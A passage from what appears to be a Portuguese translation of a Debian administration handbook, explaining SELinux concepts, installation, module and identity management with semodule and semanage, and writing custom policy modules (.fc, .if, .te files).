      <title>Princípios</title>

      <para>SELinux (<emphasis>Security Enhanced Linux</emphasis>) é um sistema de <emphasis>controle de acesso obrigatório</emphasis> construído sobre a interface LSM (<emphasis>Linux Security Modules</emphasis>) do Linux. Na prática, o kernel consulta o SELinux antes de cada chamada do sistema para saber se o processo está autorizado a fazer a operação dada.</para>

      <para>SELinux utiliza um conjunto de regras - conhecidos coletivamente como uma <emphasis>política</emphasis> - para autorizar ou proibir as operações. Essas regras são difíceis de criar. Felizmente, duas diretivas padroes (<emphasis>targeted</emphasis> e <emphasis>strict</emphasis>) são fornecidas para evitar a maior parte do trabalho de configuração.</para>

      <para>Com o SELinux, a gestão dos direitos é completamente diferente do sistema Unix tradicional. Os direitos de um processo depende de seu <emphasis>contexto de segurança</emphasis>. O contexto é definido pela <emphasis>identidade</emphasis> do usuário que iniciou o processo, o <emphasis>papel</emphasis> e o <emphasis>domínio</emphasis> que o usuário realizada naquele momento. Os direitos realmente dependem do domínio, mas transições entre os domínios são controladas pelos papéis. Finalmente, as transições possíveis entre os papéis dependem da identidade.</para>

      <figure>
        <title>Contextos de segurança e usuários Unix</title>
        <mediaobject>
          <imageobject>
            <imagedata fileref="images/selinux-context.png" scalefit="1" width="65%" />
          </imageobject>
        </mediaobject>
      </figure>

      <para>Na prática, durante o login, ao usuário é atribuído um contexto de segurança padrão (dependendo das funções que eles devem ser capazes de endossar). Isto define o domínio corrente e, assim, o domínio que todos os novos processos filho irao transportar. Se você quiser alterar o papel atual e seu domínio associado, você deve chamar <command>newrole-r <replaceable> role_r </replaceable>-t <replaceable>domain_t</replaceable></command> (normalmente há apenas um único domínio permitido para uma determinada função, o parâmetro <literal>-t</literal> pode, assim, muitas vezes, ser deixado de fora). Este comando autentica você pedindo que você digite sua senha. Este recurso proíbe programas mudarem automaticamente os papéis. Tais mudanças só podem acontecer se forem expressamente permitidas pela política SELinux.</para>

      <para>Obviamente, os direitos não se aplicam a todos os <emphasis>objetos</emphasis> (arquivos, diretórios, soquetes, dispositivos, etc.). Eles podem variar de objeto para objeto. Para conseguir isso, cada objeto é associado a um <emphasis>tipo</emphasis> (isto é conhecido como etiquetagem). Direitos de domínio são, portanto, expressos com conjuntos de operações (não) permitidos sobre os tipos (e, indiretamente, em todos os objetos que são etiquetados com o tipo de dado).</para>

      <sidebar>
        <title><emphasis>EXTRA</emphasis> Domínios e Tipos são equivalentes</title>

	<para>Internamente um domínio é apenas um tipo, mas um tipo que só se aplica a processos. É por isso que os domínios tem sufixo <literal>_t</literal> igual aos tipos de objeto.</para>
      </sidebar>

      <para>Por padrão, um programa herda seu domínio do usuário que o iniciou, mas políticas SELinux padrões esperam que muitos programas importantes sejam executados em domínios dedicados. Para conseguir isso, estes executáveis são marcados com um tipo específico (por exemplo <command>ssh</command>) é marcado com <literal>ssh_exec_t</literal>, e quando o programa é iniciado, ele muda automaticamente no domínio <literal>ssh_t</literal>). Este mecanismo de transição automática de domínio torna possível conceder apenas os direitos necessários para cada programa. É um princípio fundamental do SELinux.</para>

      <figure>
        <title>Transicoes automaticas entre dominios</title>
        <mediaobject>
          <imageobject>
            <imagedata fileref="images/selinux-transitions.png" scalefit="1" width="35%" />
          </imageobject>
        </mediaobject>
      </figure>

      <sidebar>
        <title><emphasis>NA PRATICA</emphasis> Encontrar o contexto de segunranca</title>
        <indexterm><primary>contexto de seguranca</primary></indexterm>
        <indexterm><primary>contexto, contexto de seguranca</primary></indexterm>
        <indexterm><primary>MCS (<emphasis>Multi-Category Security</emphasis>)</primary></indexterm>

	<para>Para encontrar o contexto de segurança de um determinado processo, você deve usar a opção <literal>Z</literal> do <command>ps</command>.</para>

        <screen><computeroutput>$ </computeroutput><userinput>ps axZ | grep vstfpd</userinput>
<computeroutput>system_u:system_r:ftpd_t:s0   2094 ?    Ss  0:00 /usr/sbin/vsftpd</computeroutput></screen>

	<para>O primeiro campo contém a identidade, o papel, o domínio e o nível MCS, separados por vírgulas. O nível de MCS (<emphasis>Multi-Category Security</emphasis>) é um parâmetro que intervém na configuração de uma política de protecção da confidencialidade, que regula o acesso a arquivos com base em sua sensibilidade. Esta funcionalidade não será explicada neste livro.</para>

	<para>Para encontrar o contexto de segurança atual em um shell, você deve chamar <command>id-Z</command>.</para>

        <screen><computeroutput>$ </computeroutput><userinput>id -Z</userinput>
<computeroutput>unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023</computeroutput></screen>

	<para>Finalmente, para encontrar o tipo atribuído a um arquivo, você pode usar o <command>ls -Z</command>.</para>

        <screen><computeroutput>$ </computeroutput><userinput>ls -Z test /usr/bin/ssh</userinput>
<computeroutput>unconfined_u:object_r:user_home_t:s0 test
     system_u:object_r:ssh_exec_t:s0 /usr/bin/ssh</computeroutput></screen>

	<para>É interessante notar que a identidade e o papel atribuído a um arquivo não têm qualquer importância especial (eles nunca são usados), mas por uma questão de uniformidade, todos os objetos são atribuídos num contexto de segurança completo.</para>
      </sidebar>
    </section>
    <section id="sect.selinux-setup">
      <title>Configurando o SELinux</title>

      <para>O suporte SELinux é construído nos kernels padroes fornecidos pelo Debian. As principais ferramentas de suporte Unix SELinux sem quaisquer modificações. É, assim, relativamente fácil, habilitar SELinux.</para>

      <para>O comando  <command>apt install selinux-basics selinux-policy-default</command> irá instalar automaticamente os pacotes necessários para configurar um sistema SELinux.</para>

      <sidebar>
        <title><emphasis>ATENCAO</emphasis> Política de referência que não está na jessie</title>
        <para>Infelizmente, os mantenedores do pacote fonte <emphasis role="pkg">refpolicy</emphasis> não resolveram bugs críticos de lançamento de seus pacotes e o pacote foi removido da jessie. Isso significa que os pacotes <emphasis role="pkg">selinux-policy-*</emphasis> não são instaláveis atualmente na jessie e precisam ser obtidos a partir de outro lugar. Espera-se que eles voltem em algum momento num dos lançamentos pontuais ou no jessie-backports. Enquanto isso, você pode obtê-los pela instável ("unstable").</para>
        <para>Essa triste situação pelo menos prova que o SELinux não é muito popular no conjunto de usuários/desenvolvedores que estão usando as versões de desenvolvimento do Debian. Assim, se você optar por usar o SELinux, você deve ter a expectativa de que a política padrão não funciona perfeitamente e você terá que investir um bom tempo para torná-lo adaptado para suas necessidades.</para>
      </sidebar>

      <para>O pacote <emphasis role="pkg">selinux-policy-default</emphasis> contém um conjunto de regras padrão. Por padrão, essa política só restringe o acesso a alguns serviços amplamente expostos. As sessões de usuários não estão restritas e, portanto, é improvável que o SELinux iria bloquear as operações legítimas do usuário. No entanto, isso faz aumentar a segurança dos serviços do sistema rodando na máquina. Para configurar uma política corresponde à antigo regra "strict", você só tem que desativar o módulo <literal>unconfined</literal> (gerenciamento de módulos está detalhada ainda nesta seção).</para>

      <para>Uma vez que a política tenha sido instalada, você deve marcar todos os arquivos disponíveis (o que significa atribuir-lhes um tipo). Esta operação deve ser iniciada manualmente com <command>fixfiles relabel</command>.</para>

      <para>O sistema SELinux agora está pronto. Para habilitá-lo, você deve adicionar o parâmetro <literal>selinux=1  security=selinux</literal> para o kernel Linux. O parâmetro <literal>audit=1</literal> habilita o log SELinux que registra todas operações negadas. Finalmente, o parâmetro <literal>enforcing=1</literal> traz as regras para aplicação: sem ele SELinux funciona no modo padrão <emphasis>permissive</emphasis> onde as ações negadas são registradas, mas ainda executadas. Você deve, portanto, modificar o arquivo de configuração do GRUB para anexar os parâmetros desejados. Uma maneira fácil de fazer isso é modificar a variável   <literal>GRUB_CMDLINE_LINUX</literal> em <filename>/etc/default/grub</filename> e executar <command>update-grub</command>. SELinux estará ativo após uma reinicialização.</para>

      <para>É interessante notar que o script <command>selinux-activate</command> automatiza as operações e força uma rotulagem na próxima inicialização (o que evita criacao de novos arquivos não-rotulados enquanto o SELinux ainda não estiver ativo, e enquanto a rotulagem estiver acontecendo).</para>
    </section>
    <section id="sect.selinux-management">
      <title>Gerenciando um Sistema SELinux</title>
      <indexterm><primary><command>semodule</command></primary></indexterm>
      <indexterm><primary><command>semanage</command></primary></indexterm>

      <para>A política do SELinux é um conjunto modular de regras, e sua instalação detecta e permite automaticamente todos os módulos relevantes com base nos serviços já instalados. O sistema é assim imediatamente operacional. No entanto, quando um serviço é instalado após a política do SELinux, você deve ser capaz de habilitar manualmente o módulo correspondente. Esse é o propósito do comando <command>semodule</command>. Além disso, você deve ser capaz de definir as funções que cada usuário pode endossar, e isso pode ser feito com o comando <command>semanage</command>.</para>

      <para>Estes dois comandos podem assim ser usados para modificar a atual configuração do SELinux, que é armazenada em <filename>/etc/selinux/default/</filename>. Ao contrário de outros arquivos de configuração que você pode encontrar em <filename>/etc/</filename>, todos esses arquivos não devem ser alterados manualmente. Você deve usar os programas concebidos para este proposito.</para>

      <sidebar>
        <title><emphasis>INDO ALEM</emphasis> Mais documentacao</title>

	<para>Uma vez que a NSA não fornece qualquer documentação oficial, a comunidade criou um wiki para compensar. Reúne uma série de informações, mas você deve estar ciente que os maiores contribuintes SELinux são usuários do Fedora (onde o SELinux está habilitado por padrão). A documentação, portanto, tende a tratar especificamente com essa distribuição. <ulink type="block" url="http://www.selinuxproject.org" /></para>

	<para>Você também deve ter olhado para a página wiki dedicada ao Debian, bem como blog de Russell Coker, que é um dos desenvolvedores mais ativos do Debian trabalhando no suporte SELinux. <ulink type="block" url="http://wiki.debian.org/SELinux" /> <ulink type="block" url="http://etbe.coker.com.au/tag/selinux/ " /></para>
      </sidebar>
      <section>
        <title>Gerenciando Modulos SELinux</title>

	<para>Módulos SELinux disponíveis são armazenados no diretorio <filename>/usr/share/selinux/default/</filename>. Para habilitar um desses módulos na configuração atual, você deve usar <command>semodule-i <replaceable>module.pp.bz2</replaceable></command>. A extensão <emphasis>pp.bz2</emphasis> significa <emphasis>pacote política</emphasis> (compactada com bzip2).</para>

	<para>A removecao de um módulo a partir da configuração atual é feita com <command>semodule -r <replaceable>module</replaceable></command>. Finalmente, o comando <command>semodule -l</command> listas os modulos que estao atualmente instalados. Também mostra seus números de versão. Môdulos podem ser seletivamente habilitados com <command>semodule -e</command> e desabilitados com <command>semodule -d</command>.</para>

        <screen><computeroutput># </computeroutput><userinput>semodule -i /usr/share/selinux/default/abrt.pp.bz2</userinput>
<computeroutput># </computeroutput><userinput>semodule -l</userinput>
<computeroutput>abrt    1.5.0   Disabled
accountsd       1.1.0   
acct    1.6.0   
[...]</computeroutput>
<computeroutput># </computeroutput><userinput>semodule -e abrt</userinput>
<computeroutput># </computeroutput><userinput>semodule -d accountsd</userinput>
<computeroutput># </computeroutput><userinput>semodule -l</userinput>
<computeroutput>abrt    1.5.0
accountsd       1.1.0   Disabled
acct    1.6.0   
[...]</computeroutput>
<computeroutput># </computeroutput><userinput>semodule -r abrt</userinput>
<computeroutput># </computeroutput><userinput>semodule -l</userinput>
<computeroutput>accountsd       1.1.0   Disabled
acct    1.6.0   
[...]</computeroutput></screen>

	<para><command>semodule</command> imediatamente carrega a nova configuração, a menos que você use sua opção <literal>-n </literal>. É interessante notar que o programa atua por padrão na configuração atual (que é indicada pela variavel <literal>SELINUXTYPE</literal> em <filename>/etc/selinux/config</filename>), mas que você pode modificar outra, especificando-a com a opcao <literal>opção-s</literal>.</para>
      </section>
      <section>
        <title>Gerenciando Identidades</title>

	<para>Toda vez que um usuário faz logon, eles se atribui uma identidade SELinux. Esta identidade define os papéis que eles serão capazes de endossar. Estes dois mapeamentos (do usuário para a identidade e de esta identidade para papéis) são configuráveis com o comando <command>semanage</command>.</para>

	<para>Você deve definitivamente ler a página de manual <citerefentry><refentrytitle>semanage</refentrytitle><manvolnum>8</manvolnum></citerefentry>, mesmo se a sintaxe do comando tende a ser semelhante para todos os conceitos que são geridos. Você vai encontrar opções comuns a todos os sub-comandos: <literal>-a</literal> para adicionar, <literal>-d</literal> para excluir, <literal>-m</literal> para modificar, <literal>-l</literal> para listar, e <literal>-t</literal> para indicar um tipo (ou domínio).</para>

	<para><command>semanage login -l</command> lista o atual mapeamento entre identificadores de usuário e identidades SELinux. Os usuários que não têm entrada explícita obter a identidade indicado na entrada <literal>__default__</literal>. O comando <command>semanage login -a -s user_u <replaceable>user</replaceable></command> irá associar a identidade <emphasis>user_u</emphasis> ao determinado usuário. Finalmente,<command>semanage login -d <replaceable>user</replaceable></command> exclui a entrada de mapeamento atribuído a este usuário.</para>

        <screen><computeroutput># </computeroutput><userinput>semanage login -a -s user_u rhertzog</userinput>
<computeroutput># </computeroutput><userinput>semanage login -l</userinput>
<computeroutput>
Login Name           SELinux User         MLS/MCS Range        Service

__default__          unconfined_u         SystemLow-SystemHigh *
rhertzog             user_u               SystemLow            *
root                 unconfined_u         SystemLow-SystemHigh *
system_u             system_u             SystemLow-SystemHigh *
# </computeroutput><userinput>semanage login -d rhertzog</userinput> </screen>

	<para><command>semanage user -l</command> lista o mapeamento entre as identidades de usuários do SELinux e papéis permitidos. Adicionar uma nova identidade requer definir os papéis correspondentes e um prefixo de marcação que é usado para designar um tipo de arquivo pessoal (<filename>/home/<replaceable>usuário</replaceable>/*</filename>). O prefixo deve ser escolhido entre <literal>user</literal>, o <literal>staff</literal>, e o <literal>sysadm</literal>. O prefixo "<literal>staff</literal>" resulta em arquivos do tipo "<literal>staff_home_dir_t</literal>". Criar uma nova identidade de usuário SELinux é feita com <command>semanage usuário -a -R <replaceable>papéis</replaceable> -P <replaceable>prefixo</replaceable> <replaceable>identidade</replaceable></command>. Finalmente, você pode remover uma identidade de usuário SELinux com <command>semanage usuário -d <replaceable>identidade</replaceable></command>.</para>

        <screen><computeroutput># </computeroutput><userinput>semanage user -a -R 'staff_r user_r' -P staff test_u</userinput>
<computeroutput># </computeroutput><userinput>semanage user -l</userinput>
<computeroutput>
                Labeling   MLS/       MLS/                          
SELinux User    Prefix     MCS Level  MCS Range             SELinux Roles

root            sysadm     SystemLow  SystemLow-SystemHigh  staff_r sysadm_r system_r
staff_u         staff      SystemLow  SystemLow-SystemHigh  staff_r sysadm_r
sysadm_u        sysadm     SystemLow  SystemLow-SystemHigh  sysadm_r
system_u        user       SystemLow  SystemLow-SystemHigh  system_r
test_u          staff      SystemLow  SystemLow             staff_r user_r
unconfined_u    unconfined SystemLow  SystemLow-SystemHigh  system_r unconfined_r
user_u          user       SystemLow  SystemLow             user_r
# </computeroutput><userinput>semanage user -d test_u</userinput></screen>
      </section>
      <section>
        <title>Gerenciamento de arquivos Contextos, Portas e booleanos</title>

	<para>Cada módulo SELinux fornece um conjunto de regras de rotulagem de arquivos, mas também é possível adicionar regras de rotulagem personalizadas para atender a um caso específico. Por exemplo, se você deseja que o servidor web para seja capaz de ler arquivos dentro da hierarquia de arquivos <filename>/srv/www/</filename>, você pode executar semanage <command> fcontext-a-t httpd_sys_content_t "/srv/www(/.*)? "</command> seguido de <command> restorecon -R /srv/www/</command>. O comando anterior registra as novas regras de rotulagem e redefine o último dos tipos de arquivos de acordo com as atuais regras de rotulagem.</para>

	<para>Da mesma forma, portas TCP/UDP são rotuladas de uma forma que garante que apenas os daemons correspondentes podem ouvir nelas. Por exemplo, se você quiser que o servidor web seja capaz de escutar na porta 8080, você deve executar <command>semanage port -m -t http_port_t -p tcp 8080</command>.</para>

	<para>Alguns módulos do SELinux exportar opções booleanas que você pode alterar para alterar o comportamento das regras padrão. O utilitário <command>getsebool</command> pode ser usado para inspecionar as opções (<command>getsebool<replaceable>boolean</replaceable></command> exibe uma opção, e <command>getsebool -a</command> todas elas). O comando <command>setsebool <replaceable>boolean</replaceable> <replaceable>value</replaceable></command> muda o valor atual de uma opção booleana. A opcao <literal>-P</literal> faz a mudança permanente, isso significa que o novo valor passa a ser o padrão e será mantido entre as reinicializações. O exemplo abaixo servidores web concede acesso para diretórios home (isto é útil quando os usuários têm sites pessoais em <filename>~/public_html/</filename>).</para>

        <screen><computeroutput># </computeroutput><userinput>getsebool httpd_enable_homedirs</userinput>
<computeroutput>httpd_enable_homedirs --&gt; off
# </computeroutput><userinput>setsebool -P httpd_enable_homedirs on</userinput>
<computeroutput># </computeroutput><userinput>getsebool httpd_enable_homedirs</userinput> 
<computeroutput>httpd_enable_homedirs --&gt; on</computeroutput></screen>
      </section>
    </section>
    <section id="sect.selinux-custom-rules">
      <title>Adaptando as Regras</title>

      <para>Uma vez que a política do SELinux é modular, pode ser interessante para desenvolver novos módulos para (possivelmente personalizar) aplicações que não os possuem. Estes novos módulos, então, completarao a <emphasis>política de referência</emphasis>.</para>

      <para>Para criar novos módulos, o pacote <emphasis role="pkg">selinux-policy-dev</emphasis> é necessário, bem como  <emphasis role="pkg">selinux-policy-doc</emphasis>. Este último contém a documentação das regras padrão (<filename>/usr/share/doc/selinux-policy-doc/html/</filename>) da amostra e arquivos que podem ser usados como modelos para criar novos módulos. Instale estes arquivos e os estude mais de perto:</para>

      <screen><computeroutput>$ </computeroutput><userinput>cp /usr/share/doc/selinux-policy-doc/Makefile.example Makefile</userinput>
<computeroutput>$ </computeroutput><userinput>cp /usr/share/doc/selinux-policy-doc/example.fc ./</userinput>
<computeroutput>$ </computeroutput><userinput>cp /usr/share/doc/selinux-policy-doc/example.if ./</userinput>
<computeroutput>$ </computeroutput><userinput>cp /usr/share/doc/selinux-policy-doc/example.te ./</userinput></screen>

      <para>O arquivo <filename>.te</filename> é o mais importante. Ele define as regras. O arquivo <filename>.fc</filename> define os arquivos de contextos", isto é, os tipos atribuídos a arquivos relacionados a este módulo. Os dados dentro do arquivo <filename>.fc</filename> são utilizados durante a etapa de rotulagem do arquivo. Finalmente, o arquivo <filename>if</filename> define a interface do módulo: é um conjunto de "funções públicas" que outros módulos podem usar para interagir adequadamente com o módulo que você está criando.</para>
      <section>
        <title>Escrevendo um arquivo <filename>.fc</filename></title>

	<para>Lendo o exemplo a seguir deve ser suficiente para compreender a estrutura de tal arquivo. Você pode usar expressões regulares para atribuir o mesmo contexto de segurança de vários arquivos, ou até mesmo uma árvore de diretórios.</para>

        <example>
          <title>arquivo <filename>example.fc</filename></title>

          <programlisting role="scale"># myapp executavel tera:
# label: system_u:object_r:myapp_exec_t
# MLS sensibilidade: s0
# MCS categorias: &lt;nenhuma&gt;

/usr/sbin/myapp         --      gen_context(system_u:object_r:myapp_exec_t,s0)</programlisting>
        </example>
      </section>
      <section>
        <title>Escrevendo um arquivo <filename>.if</filename></title>

	<para>No exemplo abaixo, a primeira interface ("<literal>myapp_domtrans</literal>") controla quem pode executar o aplicativo. O segundo ("<literal>myapp_read_log</literal>") concede direitos de leitura nos arquivos de log do aplicativo.</para>

	<para>Cada interface deve gerar um conjunto válido de regras que podem ser incorporadas em um arquivo <filename>.te</filename>. Você deve, portanto, declarar todos os tipos que você utiliza (com a macro <literal>gen_require</literal>), e usar diretivas padrão de concessão de direitos. Note, no entanto, que você pode usar interfaces fornecidas por outros módulos. A próxima seção irá dar mais explicações sobre a forma de expressar esses direitos.</para>

        <example>
          <title>Arquivo <filename>example.if</filename></title>

          <programlisting>## &lt;summary&gt;Myapp exemple de politica&lt;/summary&gt;
## &lt;desc&gt;
##      &lt;p&gt;
##              Mais um texto descritivo sobre myapp.  A tag &lt;desc&gt;
##              tambem pode usar &lt;p&gt;, &lt;ul&gt;, e &lt;ol&gt;
##              tags html para formatacao;
##      &lt;/p&gt;
##      &lt;p&gt;
##              Esta politica suporta as seguintes myapp caracteristicas:
##              &lt;ul&gt;
##              &lt;li&gt;Caracteristica A&lt;/li&gt;
##              &lt;li&gt;Caracteristica B&lt;/li&gt;
##              &lt;li&gt;Caracteristica C&lt;/li&gt;
##              &lt;/ul&gt;
##      &lt;/p&gt;
## &lt;/desc&gt;
#

########################################
## &lt;sumario&gt;
##      Executar uma transição de domínio para executar myapp.
## &lt;/sumario&gt;
## &lt;param name="domain"&gt;
##      Domínio permitiu a transição.
## &lt;/param&gt;
#
interface(`myapp_domtrans',`
        gen_require(`
                type myapp_t, myapp_exec_t;
        ')

        domtrans_pattern($1,myapp_exec_t,myapp_t)
')

########################################
## &lt;summary&gt;
##      Ler arquivos de log myapp.
## &lt;/summary&gt;
## &lt;param name="domain"&gt;
##      Domínio permitiu ler os arquivos de log.
## &lt;/param&gt;
#
interface(`myapp_read_log',`
        gen_require(`
                type myapp_log_t;
        ')

        logging_search_logs($1)
        allow $1 myapp_log_t:file r_file_perms;
')</programlisting>
        </example>

        <sidebar>
          <title><emphasis>DOCUMENTACAO</emphasis> Explicações sobre a <emphasis>política de referência</emphasis></title>

	  <para>A <emphasis>política de referência</emphasis> evolui como qualquer projeto de software livre: baseado em contribuições voluntárias. O projeto é hospedado pelo Tresys, uma das empresas mais ativas no domínio SELinux. Sua wiki contém explicações sobre como as regras são estruturadas e como você pode criar novas. <ulink type="block" url="https://github.com/TresysTechnology/refpolicy/wiki/GettingStarted" /></para>
        </sidebar>
      </section>
      <section id="sect.writing-a-te-file">
        <title>Escrevendo um Arquivo <filename>.te</filename></title>

	<para>De uma olhada no arquivo <filename>example.te</filename>:</para>

        <sidebar>
          <title><emphasis>INDO ALEM</emphasis> A linguagem de macro <command>m4</command></title>

	  <para>Para estruturar adequadamente a política, os desenvolvedores do SELinux utilizado um processador de comandos macro. Em vez de duplicar varios diretivas de permissoes <emphasis>similares</emphasis>,  eles criaram "funções macro", para usar uma lógica de alto nível, o que também resulta em uma política muito mais legível.</para>

	  <para>Na prática, <command>m4</command> é usado para compilar essas regras. Ele faz a operação inversa: ele expande todas estas directivas de alto nível em um enorme banco de dados de diretivas de <emphasis>permissoes</emphasis>.</para>

	  <para>As "interfaces" SELinux são apenas funções de macro que serão substituídas por uma série de regras no momento da compilação. Da mesma forma, alguns direitos são conjuntos de fatos de direitos que são substituídos por seus valores em tempo de compilação.</para>
        </sidebar>

        <programlisting>policy_module(myapp,1.0.0) <co id="example.te.module"></co>

########################################
#
# Declaracoes
#

type myapp_t; <co id="example.te.type"></co>
type myapp_exec_t;
domain_type(myapp_t)
domain_entry_file(myapp_t, myapp_exec_t) <co id="example.te.domain"></co>

type myapp_log_t;
logging_log_file(myapp_log_t) <co id="example.te.interface"></co>

type myapp_tmp_t;
files_tmp_file(myapp_tmp_t)

########################################
#
# Politica local Myapp 
#

allow myapp_t myapp_log_t:file { read_file_perms append_file_perms }; <co id="example.te.allow"></co>

allow myapp_t myapp_tmp_t:file manage_file_perms;
files_tmp_filetrans(myapp_t,myapp_tmp_t,file)</programlisting>
        <calloutlist>
          <callout arearefs="example.te.module">
	    <para>O modulo deve ser identificado pelo seu nome e numero da versao. Esta diretiva é requerida.</para>
          </callout>
          <callout arearefs="example.te.type">
	    <para>Se o módulo introduz novos tipos, deve declará-los com as directivas como este. Não hesite em criar tantos tipos quantas forem necessários em vez de conceder muitos direitos inúteis.</para>
          </callout>
          <callout arearefs="example.te.domain">
	    <para>Estas interfaces definem o tipo <literal>myapp_t</literal> como uma área processo que deve ser utilizada por qualquer executável rotulado com <literal>myapp_exec_t</literal>. Implicitamente, isso adiciona um atributo <literal>exec_type</literal> sobre esses objetos, que por sua vez permite que outros módulos de concessão de direitos para executar esses programas: por exemplo, o módulo <literal>userdomain</literal>, permite que os processos com domínios <literal>user_t</literal>, <literal>staff_t</literal> e <literal>sysadm_t</literal> execute os. Os domínios de outras aplicações confinadas não terão direitos para executar los, a menos que as regras lhes concedem direitos semelhantes (este é o caso, por exemplo, do <command>dpkg</command> com o seu domínio <literal>dpkg_t</literal>).</para>
          </callout>
          <callout arearefs="example.te.interface">
	    <para><literal>logging_log_file</literal> é uma interface fornecida pela política de referência. Ela indica que os arquivos marcados com o tipo de dado são arquivos de log que deveriam beneficiar das regrassociadas (por exemplo concedem direitos ao <command>logrotate</command> para que possa manipulá los).</para>
          </callout>
          <callout arearefs="example.te.allow">
	    <para>O diretiva <literal>permicao</literal> é a diretiva de base utilizada para autorizar uma operação. O primeiro parâmetro é o domínio processo que tem a permissao para executar a operação. A segunda define o objeto que um processo do domínio anterior pode manipular. Este parâmetro é a forma "<replaceable>tipo</replaceable>: <replaceable>classe</replaceable>" onde <replaceable>tipo</replaceable> é o seu tipo SELinux e <replaceable>classe</replaceable> descreve a natureza do objeto (arquivo, diretório, socket, fifo, etc.) Finalmente, o último parâmetro descreve as permissões (as operações permitidas).</para>

	    <para>As permissões são definidas como o conjunto de operações permitidas e segue este modelo: <literal>{ <replaceable>operacao1</replaceable><replaceable>operacao2</replaceable>}</literal>. No entanto, você também pode usar macros que representam as permissões mais úteis. O <filename>/usr/share/selinux/devel/include/support/obj_perm_sets.spt</filename> os lista.</para>

	    <para>A página web a seguir fornece uma lista relativamente exaustiva de classes de objetos e permissões que podem ser concedidas. <ulink type="block" url="http://www.selinuxproject.org/page/ObjectClassesPerms" /></para>
          </callout>
        </calloutlist>

	<para>Agora você só tem que encontrar o conjunto mínimo de regras necessárias para assegurar que o aplicativo de destino ou serviço funcione corretamente. Para conseguir isso, você deve ter um bom conhecimento de como o aplicativo funciona e de que tipo de dados ele gerencia e/ou gera.</para>

	<para>No entanto, uma abordagem empírica é possível. Uma vez que os objetos relevantes são rotuladas corretamente, você pode usar o aplicativo no modo permissivo: as operações que seriam proibidos são registrados, mas ainda tem sucesso. Ao analisar os logs, você pode agora identificar as operações de permissao. Aqui esta um exemplo de uma tal entrada de log:</para>

        <programlisting>avc:  denied  { read write } for  pid=1876 comm="syslogd" name="xconsole" dev=tmpfs ino=5510 scontext=system_u:system_r:syslogd_t:s0 tcontext=system_u:object_r:device_t:s0 tclass=fifo_file permissive=1</programlisting>

	<para>Para melhor entender esta mensagem, vamos estudá la peça por peça.</para>

        <table colsep="1">
          <title>Análise de um rastreamento SELinux</title>
          <tgroup cols="2">
            <thead>
              <row>
                <entry>Mensagem</entry>
                <entry>Descricao</entry>
              </row>
            </thead>
            <tbody>
              <row>
                <entry><computeroutput>avc: denied</computeroutput></entry>
                <entry>Uma operação foi negada.</entry>
              </row>
              <row>
                <entry><computeroutput>{ read write }</computeroutput></entry>
                <entry>Esta operação exigiu permissões de  <literal>leitura</literal> e <literal>escrita</literal>.</entry>
              </row>
              <row>
                <entry><computeroutput>pid=1876</computeroutput></entry>
                <entry>O processo com PID 1876 executou a operacao (ou tentou executa la).</entry>
              </row>
              <row>
                <entry><computeroutput>comm="syslogd"</computeroutput></entry>
                <entry>O processo foi um exemplo do programa <literal>syslogd</literal>.</entry>
              </row>
              <row>
                <entry><computeroutput>name="xconsole"</computeroutput></entry>
                <entry>O objeto alvo foi nomeado <literal>xconsole</literal>. Às vezes, você pode também ter uma variável “path” — com o caminho completo — como opção.</entry>
              </row>
              <row>
                <entry><computeroutput>dev=tmpfs</computeroutput></entry>
                <entry>O dispositivo que hospeda o objeto de destino é um <literal>tmpfs</literal> (um sistema de arquivos em memória). Para um disco real, você poderia ver a partição que hospeda o objeto (por exemplo: "sda3").</entry>
              </row>
              <row>
                <entry><computeroutput>ino=5510</computeroutput></entry>
                <entry>O objeto esta identificado pelo inode numero 5510.</entry>
              </row>
              <row>
                <entry><computeroutput>scontext=system_u:system_r:syslogd_t:s0</computeroutput></entry>
                <entry>Este é o contexto de segurança do processo que executou a operação.</entry>
              </row>
              <row>
                <entry><computeroutput>tcontext=system_u:object_r:device_t:s0</computeroutput></entry>
                <entry>Este é o contexto de segurança do objeto destino.</entry>
              </row>
              <row>
                <entry><computeroutput>tclass=fifo_file</computeroutput></entry>
                <entry>O objeto destino é um arquivo FIFO.</entry>
              </row>
            </tbody>
          </tgroup>
        </table>

	<para>Ao observar essa entrada de log, é possível construir uma regra que permite esta operação. Por exemplo: <literal>allow syslogd_t device_t:fifo_file { read write }</literal>. Este processo pode ser automatizado, e é exatamente o que o comando <command>audit2allow</command> oferece (do pacote <emphasis role="pkg">policycoreutils</emphasis>). Esta abordagem só é útil se os vários objetos já estão corretamente rotulados de acordo com o que deve ser confinado. Em qualquer caso, você terá que analisar cuidadosamente as regras geradas e as validar de acordo com o seu conhecimento da aplicacao. Efetivamente, essa abordagem tende a conceder mais direitos do que são realmente necessários. A solução adequada é muitas vezes criar novos tipos de concessão de direitos apenas sobre esses tipos. Acontece também de uma operação negada não ser fatal para a aplicação, neste caso pode ser melhor adicionar uma regra "<literal>dontaudit</literal>" para evitar a entrada de log, apesar da efetiva negação.</para>

        <sidebar>
          <title><emphasis>COMPLEMENTOS</emphasis> Nao ha papeis nas regras de politicas</title>
          <indexterm><primary>Tipo de Aplicação</primary></indexterm>
          <indexterm><primary>Aplicação, Tipo de Aplicação</primary></indexterm>

	  <para>Pode parecer estranho que os papéis não aparecem em tudo ao criar novas regras. SELinux utiliza apenas os domínios para descobrir quais operações são permitidas. A intervenção do papel apenas de forma indireta, permitindo ao usuário alternar para outro domínio. SELinux é baseado em uma teoria conhecida como <emphasis>Tipo de aplicacao</emphasis> e o tipo é o único elemento que importa na concessão de direitos.</para>
        </sidebar>
      </section>
      <section>
        <title>Compilando os Arquivos</title>

	<para>Uma vez que os 3 arquivos (<filename>example.if</filename>, <filename>example.fc</filename>, e <filename>example.te</filename>) correspondem às suas expectativas para as novas regras, basta executar <command>make NAME=devel</command> para gerar um módulo no arquivo <filename>example.pp file&gt;</filename> (você pode o carregar imediatamente com <command>semodule -i example.pp</command>). Se vários módulos são definidos, <command>make</command> irá criar todos os arquivos correspondentes <filename>.pp</filename>.</para>
      </section>
    </section>
  </section>
  <section id="sect.other-security-considerations">
    <title>Outras Consideracoes Relacionadas a Seguranca</title>

    <para>Segurança não é apenas um problema técnico, mais do que qualquer coisa, é sobre as boas práticas e compreenção dos riscos. Esta seção examina alguns dos riscos mais comuns, bem como algumas das melhores práticas que deverao, dependendo do caso, aumentar a segurança ou diminuir o impacto de um ataque bem sucedido.</para>
    <section>
      <title>Riscos Inerentes a Aplicações Web</title>

